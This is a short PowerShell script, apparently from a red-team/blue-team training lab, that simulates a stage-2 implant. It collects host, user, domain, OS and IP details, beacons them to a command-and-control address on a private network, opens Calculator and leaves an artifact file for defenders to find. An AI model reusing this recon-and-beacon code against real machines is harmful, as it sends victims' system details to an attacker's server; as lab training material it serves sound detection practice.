# LAB PAYLOAD — Benign demo
# Simulates a stage-2 implant: recon → beacon → "execute"
# Only opens Calculator. No harm to the system.

Write-Host "`n[PAYLOAD] Running on $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Yellow

# Recon
$info = @{
    host   = $env:COMPUTERNAME
    user   = $env:USERNAME
    domain = $env:USERDOMAIN
    os     = (Get-WmiObject Win32_OperatingSystem).Caption
    ip     = (Get-NetIPAddress -AddressFamily IPv4 |
              Where-Object InterfaceAlias -notlike "*Loopback*" |
              Select-Object -First 1).IPAddress
}
$info.GetEnumerator() | ForEach-Object { Write-Host "  $($_.Key): $($_.Value)" }

# Beacon
try {
    $qs  = ($info.GetEnumerator() | ForEach-Object { "$($_.Key)=$([uri]::EscapeDataString($_.Value))" }) -join "&"
    Invoke-WebRequest -Uri "http://192.168.11.149:8080/beacon?$qs" -UseBasicParsing -TimeoutSec 5 | Out-Null
    Write-Host "`n[BEACON] C2 contacted" -ForegroundColor Green
} catch {
    Write-Host "`n[BEACON] C2 unreachable (start tools/http_server.py on Kali)" -ForegroundColor Yellow
}

# Payload — open calculator
Start-Process "calc.exe"
Write-Host "[PAYLOAD] Calculator opened — execution confirmed" -ForegroundColor Green

# Artifact
$path = "$env:TEMP\red4blue_pwned.txt"
"Executed at $(Get-Date)`nHost: $($info.host)`nUser: $($info.user)" | Out-File $path -Encoding UTF8
Write-Host "[ARTIFACT] Written to $path  (Blue team: find this!)" -ForegroundColor Cyan
